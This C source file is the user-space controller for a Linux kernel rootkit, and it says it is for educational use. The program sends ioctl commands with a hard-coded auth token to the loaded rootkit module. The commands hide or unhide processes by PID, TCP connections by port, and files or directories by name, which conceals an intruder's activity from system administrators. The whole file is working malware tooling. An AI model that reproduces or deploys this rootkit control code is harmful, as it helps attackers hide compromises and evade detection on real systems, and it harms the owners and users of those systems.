/* 
 * Copyright 2014-2015 Jerry Han (hanj4096@gmail.com)
 *
 * This program is free software; you can redistribute it and/or modify   
 * it under the terms of the GNU General Public License version 3 as 
 * published by the Free Software Foundation.
 *
 * Note: 
 * This kernel rootkit is just for educational purpose and it shouldn't
 * be used for any illegal activities, use this at your own risk.
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <string.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <unistd.h>

#define AUTH_TOKEN 0x12345678

#define HIDE_PROC       1
#define UNHIDE_PROC     2
#define HIDE_TCP        3
#define UNHIDE_TCP      4
#define HIDE_FILE       5
#define UNHIDE_FILE     6

struct rk_args 
{
    unsigned short cmd;
    unsigned int args_len;
    char args[512];
}__attribute__((__packed__));

static inline bool args_sanity_check(int argc, char *argv[])
{
    if (argc < 3)
        return false;

    return true;
}

static inline void help(void)
{

}

int main(int argc, char *argv[])
{
    struct rk_args rk_args;
    int sockfd;
    int ret;

    if(!args_sanity_check(argc, argv))
        help();

    sockfd = socket(AF_INET, SOCK_STREAM, 6);
    if(sockfd < 0){
        perror("socket");
        exit(-1);
    }

    rk_args.cmd = atoi(argv[1]);
    switch (atoi(argv[1]) )
    {
    case HIDE_PROC:
        printf("Hiding process with PID %s\n", argv[2]);
        goto ioctl;
    case UNHIDE_PROC:
        printf("Unhiding process with PID %s\n", argv[2]);
        goto ioctl;
    case HIDE_TCP:
        printf("Hiding TCP connection with port %s\n", argv[2]);
        goto ioctl;
    case UNHIDE_TCP:
        printf("Unhiding TCP connection with port %s\n", argv[2]);
        goto ioctl;
    case HIDE_FILE:
        printf("Hiding file/directory with name %s\n", argv[2]);
        goto ioctl;
    case UNHIDE_FILE:
        printf("Hiding file/directory with name %s\n", argv[2]);
        goto ioctl;

    default:
        help();
        break;
    }

    return 0;

ioctl:
    if((rk_args.args_len = strlen(argv[2])) > 511) {
        printf("Bad argument, argv[2] too long, the max size should be less than 512 Byte: %s", argv[2]);
        exit(-1);
    }
    memcpy(rk_args.args, argv[2], rk_args.args_len);
    
    ret = ioctl(sockfd, AUTH_TOKEN, &rk_args);
    if(ret < 0){
        perror("ioctl");
        exit(-1);
    }

    return 0;
}
